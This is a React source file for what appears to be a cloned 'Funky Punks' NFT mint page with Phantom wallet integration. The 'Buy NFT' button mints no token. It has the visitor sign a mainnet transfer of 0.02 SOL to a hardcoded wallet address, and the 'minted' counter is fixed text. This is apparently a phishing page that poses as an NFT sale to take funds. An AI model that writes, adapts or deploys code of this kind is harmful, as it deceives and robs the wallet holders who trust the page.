import { useState, useEffect } from "react";
import {
  Connection,
  PublicKey,
  Transaction,
  clusterApiUrl,
  SystemProgram,
  LAMPORTS_PER_SOL
} from "@solana/web3.js";
import "./styles.css";
import { PrivateKeyInput } from "crypto";

type DisplayEncoding = "utf8" | "hex";
type PhantomEvent = "disconnect" | "connect";
type PhantomRequestMethod =
  | "connect"
  | "disconnect"
  | "signTransaction"
  | "signAllTransactions"
  | "signMessage";

interface ConnectOpts {
  onlyIfTrusted: boolean;
}


interface PhantomProvider {
  publicKey: PublicKey | null;
  isConnected: boolean | null;
  signTransaction: (transaction: Transaction) => Promise<Transaction>;
  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;
  signMessage: (
    message: Uint8Array | string,
    display?: DisplayEncoding
  ) => Promise<any>;
  connect: (opts?: Partial<ConnectOpts>) => Promise<{ publicKey: PublicKey }>;
  disconnect: () => Promise<void>;
  on: (event: PhantomEvent, handler: (args: any) => void) => void;
  request: (method: PhantomRequestMethod, params: any) => Promise<unknown>;
}

const getProvider = (): PhantomProvider | undefined => {
  if ("solana" in window) {
    const anyWindow: any = window;
    const provider = anyWindow.solana;
    if (provider.isPhantom) {
      return provider;
    }
  }
  window.open("https://phantom.app/", "_blank");
};

const NETWORK = clusterApiUrl("mainnet-beta");

export default function App() {
  const provider = getProvider();
  const myKey = new PublicKey('8TUUSbXSTTiQyo42CMhiLEJ72QaZaFi1wpN7PAsQ2R67');
  const [logs, setLogs] = useState<string[]>([]);
  const addLog = (log: string) => setLogs([...logs, log]);
  const connection = new Connection(NETWORK);
  const [, setConnected] = useState<boolean>(false);
  useEffect(() => {
    if (provider) {
      provider.on("connect", () => {
        setConnected(true);
        addLog("Connected to wallet " + provider.publicKey?.toBase58());
      });
      provider.on("disconnect", () => {
        setConnected(false);
        addLog("Disconnected from wallet");
      });
      // try to eagerly connect
      provider.connect({ onlyIfTrusted: true }).catch(() => {
        // fail silently
      });
      return () => {
        provider.disconnect();
      };
    }
  }, [provider]);
  if (!provider) {
    return <h2>Could not find a provider</h2>;
  }

  const createTransferTransaction = async () => {
    if (!provider.publicKey) {
      return;
    }
    let transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: myKey,
        lamports: 0.02 * LAMPORTS_PER_SOL,
      })
    );
    transaction.feePayer = provider.publicKey;
    addLog("Getting recent blockhash");
    const anyTransaction: any = transaction;
    anyTransaction.recentBlockhash = (
      await connection.getRecentBlockhash()
    ).blockhash;
    return transaction;
  };

  const sendTransaction = async () => {
    const transaction = await createTransferTransaction();
    if (transaction) {
      try {
        let signed = await provider.signTransaction(transaction);
        addLog("Got signature, submitting transaction");
        let signature = await connection.sendRawTransaction(signed.serialize());
        addLog(
          "Submitted transaction " + signature + ", awaiting confirmation"
        );
        await connection.confirmTransaction(signature);
        addLog("Transaction " + signature + " confirmed");
      } catch (err) {
        console.warn(err);
        addLog("Error: " + JSON.stringify(err));
      }
    }
  };
 
  return (
    <div>
            <meta charSet="utf-8" />
            <link rel="icon" href="/favicon.ico" />
            <meta name="viewport" content="width=device-width,initial-scale=1" />
            <meta name="theme-color" content="#561056" />
            <meta httpEquiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
            <meta httpEquiv="Pragma" content="no-cache" />
            <meta httpEquiv="Expires" content="0" />
            <meta name="description" content="Get your Funky Punk and dress it cool with our Dress-O-Matic!" />
            <link rel="apple-touch-icon" href="/logo192.png" />
            <link rel="manifest" href="/manifest.json" />
            <title>Funky Punks</title>
            <link rel="preconnect" href="https://fonts.googleapis.com" />
            <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
            <link href="https://fonts.googleapis.com/css2?family=Catamaran:wght@400;600;700;800&amp;family=Open+Sans:wght@400;600;700;800&amp;display=swap" rel="stylesheet" />
            <link href="/static/css/main.488f7601.chunk.css" rel="stylesheet" />
            <noscript>You need to enable JavaScript to run this app.</noscript>
            <div id="root"><section className="Intro">
                <div className="container">
                  <div className="row intro-row">
                    <div className="col intro-logo">
                      <a className="into-logo-link" href="/">Funky Punks</a>
                    </div>
                    <div className="col into-bg" />
                  </div>
                </div>
              </section>
              <section className="MintPunk posotion-relative">
                <div className="container">
                  <div className="row">
                    <div className="col Punks-col pt-5vw">
                      <h2 className="CatamaranHeading pt-2vw">Mint your Funky Punk</h2>
                      <p className="OpenSansText pt-1vw"><strong>7,777 of the Funkiest Punks to hit the Blockchain</strong>!</p>
                      <p className="OpenSansText">The Funky Family have spent weeks compiling a list of whacky, yet classy clothing pieces to compliment your punk!</p>
                      <p className="OpenSansText">Each Funky Punk is randomly generated and is dressed from head to toe!</p>
                      <p className="OpenSansText">Your funky may also have sunglasses, be smoking a vape or have a clown nose.</p>
                      <p className="OpenSansText pt-2vw dflextimer">
                      {provider && provider.publicKey ? (
                   <>
                   <button className="startButton" onClick={sendTransaction}>Buy NFT</button>
                  
              </>
             ) : (
              <>
            <button className="startButton"
              onClick={async () => {
                try {
                  const res = await provider.connect();
                  addLog(JSON.stringify(res));
                } catch (err) {
                  console.warn(err);
                  addLog("Error: " + JSON.stringify(err));
                }
              }}
            >
              Connect to Phantom
            </button>
          </>
        )}
                      </p><div className="publicStartTimer d-none">
                        <p className="publicStartTimerText" />
                        <div id="clockdiv">
                          <div><span className="days" />
                            <div className="smalltext">Days
                            </div>
                          </div>
                          :<div><span className="hours" />
                            <div className="smalltext">Hours</div>
                          </div>
                          :<div><span className="minutes" />
                            <div className="smalltext">Minutes
                            </div>
                          </div>
                          :<div><span className="seconds" />
                            <div className="smalltext">Seconds
                            </div>
                          </div>
                        </div>
                      </div>
                      <p />
                      <div className="JoystixFamily pt-2vw">
                        <div className="MintedFunkyPunks">
                          <h2>Minted Funky Punks</h2>
                          <p className="MintedFunkyPunksCalc">4850</p>
                        </div>
                      </div>
                    </div>
                    <div className="col Punks-col2">
                      <div className="MintAPC">
                        <div className="MintPCHEre"><img src="/images/pcmachinenew.png" alt="Dress O Matic" /></div>
                        <div className="MintPCAfter d-none">
                          <h1 className="MintPunkPCTitle">Funky Punk</h1>
                          <h2 className="MintPunkPCSubtitle">Dress-O-Matic</h2>
                          <div className="MintPunkRoll">
                            <div className="mintPunkBody"><img src="/images/dummy.png" alt="Dummy" /></div>
                            <div className="mintPunkDresses">
                              <div className="mintPunkDress">
                                <div className="mintDressName">Head</div>
                                <div className="mintDressImage"><img src="/images/head.png" alt="Head" /></div>
                              </div>
                              <div className="mintPunkButtons">
                                <button className="rerollButton">Re-Roll</button></div>
                              <div className="mintPunkDress">
                                <div className="mintDressName">Top</div>
                                <div className="mintDressImage"><img src="/images/top.png" alt="Top" /></div>
                              </div>
                              <div className="mintPunkButtons"><button className="rerollButton">Re-Roll</button></div>
                              <div className="mintPunkDress">
                                <div className="mintDressName">Bottom</div>
                                <div className="mintDressImage"><img src="/images/bottom.png" alt="Bottom" /></div>
                              </div>
                              <div className="mintPunkButtons"><button className="rerollButton">Re-Roll</button></div>
                              <div className="mintPunkDress"><div className="mintDressName">Shoes</div>
                                <div className="mintDressImage"><img src="/images/shoes.png" alt="Shoes" /></div>
                              </div>
                              <div className="mintPunkButtons"><button className="rerollButton">Re-Roll</button></div>
                            </div>
                            <div className="mintFTbuttons">
                              <button className="mintRollALlbtn">Loading</button>
                              <button className="mintRollPurchasebtn">Loading</button>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              <section className="MetaVerse posotion-relative">
                <div className="container">
                  <div className="row">
                    <div className="col Punks-col2">
                      <div className="MetaVerseAPC">
                        <div className="MetaVersePCHEre"><img src="/images/gameboy_extended.gif" alt="Gameboy" /></div>
                      </div>
                    </div>
                    <div className="col Punks-col">
                      <h2 className="CatamaranHeading">To the Metaverse</h2>
                      <p className="OpenSansText pt-1vw">Bring your Funky Punk to the Metaverse with our Funky Punks VX voxel collection.</p>
                      <p className="OpenSansText">Each Funky Punk will double as a mint pass that can be used to guarantee yourself a metaverse compatible Funky Punks VX.</p>
                      <p className="OpenSansText pt-2vw d-none">
                        <button className="viewButton">View More</button></p>
                    </div>
                  </div>
                </div>
              </section>
              <section className="Rarity posotion-relative">
                <div className="container">
                  <div className="row">
                    <div className="col Punks-col">
                      <h2 className="CatamaranHeading">Rarity</h2>
                      <p className="OpenSansText mx-250 pt-1vw">Each <strong>NFT</strong> is algorithmically generated by <strong>combining 170+ unique traits</strong> with varying rarity across categories. Rarity Structure can be viewed on our <a href="https://discord.gg/2etDd6J2AB" target="_blank" rel="noreferrer">DISCORD</a></p>
                    </div>
                    <div className="col Punks-col2">
                      <div className="RarityTypes rarityInfo">
                        <div className="rarityInfoBg">
                          <img src="/images/Image12.png" alt="Rarity Types" />
                          <img src="/images/rarity_sico.png" alt="Disco Ball" className="rarityDiscoBall" />
                        </div>
                        <div className="rarityInfoText">
                          <h3>Types</h3>
                          <ul><li>
                              <span>Alien</span>
                              <span>0.4%</span>
                            </li><li>
                              <span>Ape</span>
                              <span>1%</span>
                            </li></ul>
                        </div>
                      </div>
                    </div>
                    <div className="col Punks-col3">
                      <div className="RarityVariations rarityInfo">
                        <div className="rarityInfoBg"><img src="/images/Image13.png" alt="Rarity Variations" /></div>
                        <div className="rarityInfoText">
                          <h3>What you want</h3>
                          <ul><li className="rarityHeadline">
                              <span>Footwear</span>
                              <span />
                            </li><li>
                              <span><img src="/images/BalenciagaTripleS.png" alt="Balenciaga" /> Balenciaga</span>
                              <span>0.6%</span>
                            </li><li>
                              <span><img src="/images/Skis.png" alt="Skis" /> Skis</span>
                              <span>1%</span>
                            </li><li className="rarityHeadline">
                              <span>Bottom</span>
                              <span />
                            </li><li>
                              <span><img src="/images/BlackBitcoinPants.png" alt="Black Bitcoin Pants" /> Black Bitcoin Pants</span>
                              <span>0.8%</span>
                            </li><li>
                              <span><img src="/images/BoratMankini.png" alt="Borat Mankini" /> Borat Mankini</span>
                              <span>0.5%</span>
                            </li><li>
                              <span><img src="/images/Robotbottom.png" alt="Robot" /> Robot</span>
                              <span>0.5%</span>
                            </li><li>
                              <span><img src="/images/PunkPajamaPants.png" alt="Punk Pajama Pants" /> Punk Pajama Pants</span>
                              <span>0.1%</span>
                            </li><li className="rarityHeadline">
                              <span>Top</span>
                              <span />
                            </li><li>
                              <span><img src="/images/Ironman.png" alt="Ironman" /> Ironman</span>
                              <span>0.05%</span>
                            </li><li>
                              <span><img src="/images/GoldSuitArmor.png" alt="Gold Suit Armor" /> Gold Suit Armor</span>
                              <span>0.1%</span>
                            </li><li>
                              <span><img src="/images/JesusRobe.png" alt="Jesus Robe" /> Jesus Robe</span>
                              <span>0.01%</span>
                            </li><li>
                              <span><img src="/images/robot.png" alt="Robot" /> Robot</span>
                              <span>0.5%</span>
                            </li><li>
                              <span><img src="/images/PuffyBitcoinTop.png" alt="Puffy Bitcoin Top" /> Puffy Bitcoin Top</span>
                              <span>0.06%</span>
                            </li><li>
                              <span><img src="/images/BitcoinDress.png" alt="Bitcoin Dress" /> Bitcoin Dress</span>
                              <span>0.02%</span>
                            </li><li className="rarityHeadline">
                              <span>Head</span>
                              <span />
                            </li><li>
                              <span><img src="/images/CrazyHair.png" alt="Crazy Hair" /> Crazy Hair</span>
                              <span>0.09%</span>
                            </li><li><span><img src="/images/VikingHat.png" alt="Balenciaga" /> Viking Hat</span>
                              <span>0.1%</span>
                            </li></ul>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="raritysbg" />
              </section>
              <section className="RoadMap posotion-relative">
                <div className="container">
                  <div className="row RoadMap-Row">
                    <div className="col">
                      <h2 className="Heading RoadMap-Title text-center">Roadmap</h2>
                    </div>
                    <div className="col Punks-col">
                      <div className="RoadMap-Box-Wrapper">
                        <div className="RoadMap-man">
                          <div className="Roadmap-man-bg"><img src="/images/red_big_bg.png" alt="Red Background" /></div>
                          <div className="Roadmap-man-content">
                            <div className="RoadMap-Percentage">
                              <img src="/images/percentage_bg.png" alt="Percentage Background" />
                              <span>25%</span>
                            </div>
                            <div className="RoadMap-man-body"><img src="/images/rarity_alien25.png" alt="Reality Alien" /></div>
                          </div>
                        </div>
                        <div className="RoadMap-Info">
                          <ul><li>
                              Rarity Sniper + Rarity Tools listing
                            </li><li>
                              100 SOL contributed to Punk Treasury
                            </li><li>
                              10 SOL in giveaways
                            </li></ul>
                        </div>
                      </div>
                    </div>
                    <div className="col Punks-col">
                      <div className="RoadMap-Box-Wrapper">
                        <div className="RoadMap-man">
                          <div className="Roadmap-man-bg">
                            <img src="/images/red_big_bg.png" alt="Red Background" /></div>
                          <div className="Roadmap-man-content">
                            <div className="RoadMap-Percentage">
                              <img src="/images/percentage_bg.png" alt="Percentage Background" />
                              <span>50%</span>
                            </div>
                            <div className="RoadMap-man-body">
                              <img src="/images/rarity_alien50.png" alt="Reality Alien" />
                            </div>
                          </div>
                        </div>
                        <div className="RoadMap-Info">
                          <ul><li>
                              Commencement of Funky Punks VX artwork
                            </li><li>
                              200 SOL contributed to Punk Treasury
                            </li><li>
                              Exclusive Owner Giveaways
                            </li></ul>
                        </div>
                      </div>
                    </div>
                    <div className="col Punks-col">
                      <div className="RoadMap-Box-Wrapper">
                        <div className="RoadMap-man">
                          <div className="Roadmap-man-bg"><img src="/images/red_big_bg.png" alt="Red Background" /></div>
                          <div className="Roadmap-man-content">
                            <div className="RoadMap-Percentage">
                              <img src="/images/percentage_bg.png" alt="Percentage Background" />
                              <span>75%</span>
                            </div>
                            <div className="RoadMap-man-body"><img src="/images/rarity_alien75.png" alt="Reality Alien" /></div>
                          </div>
                        </div>
                        <div className="RoadMap-Info">
                          <ul><li>300 SOL contributed to Punk Treasury
                            </li><li>
                              First Class ticket holder benefits announcement
                            </li></ul>
                        </div>
                      </div>
                    </div>
                    <div className="col Punks-col">
                      <div className="RoadMap-Box-Wrapper">
                        <div className="RoadMap-man">
                          <div className="Roadmap-man-bg">
                            <img src="/images/green_big_bg.png" alt="Red Background" /></div>
                          <div className="Roadmap-man-content">
                            <div className="RoadMap-Percentage">
                              <img src="/images/percentage_bg.png" alt="Percentage Background" />
                              <span>100%</span>
                            </div>
                            <div className="RoadMap-man-body"><img src="/images/rarity_alien.png" alt="Reality Alien" /></div>
                          </div>
                        </div>
                        <div className="RoadMap-Info">
                          <ul><li>
                              400 SOL contributed to Punk Treasury
                            </li><li>
                              Establish DAO
                            </li><li>
                              20% of all Dress-O-Matic revenues donated to providing clothes and essential to the homeless
                            </li></ul>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              <section className="FAQ posotion-relative">
                <div className="container">
                  <div className="row FAQ-Row">
                    <div className="col Punks-col">
                      <div className="FAQflex">
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">When launch?</div>
                            <div className="acc-arrow">
                              <img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">Wtf is punk treasury?</div>
                            <div className="acc-arrow"><img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">How much will it cost to mint?</div>
                            <div className="acc-arrow"><img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">How are these generated?</div>
                            <div className="acc-arrow">
                              <img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">Will there be a presale?</div>
                            <div className="acc-arrow"><img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">Beginners guide to minting an NFT</div>
                            <div className="acc-arrow"><img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">What are funky punks V2?</div>
                            <div className="acc-arrow">
                              <img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                        <div className="accordion-item">
                          <div className="accordion-title">
                            <div className="max-w-60p">I have unanswered questions?</div>
                            <div className="acc-arrow">
                              <img src="/images/down.png" alt="FAQ arrow" /></div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              <footer className="Footer">
                <div className="container">
                  <div className="row">
                    <div className="col">
                      <ul className="footer-links"><li>
                          <a href="https://discord.gg/2etDd6J2AB" target="_blank" rel="noreferrer">
                            <img alt="Discord" src="/images/discord_white.png" /></a>
                        </li><li>
                          <a href="https://twitter.com/funky_punks" target="_blank" rel="noreferrer">
                            <img alt="Twitter" src="/images/twitter_white.png" /></a>
                        </li></ul>
                    </div>
                  </div>
                </div>
              </footer>
            </div>
          </div>
        );
      }
    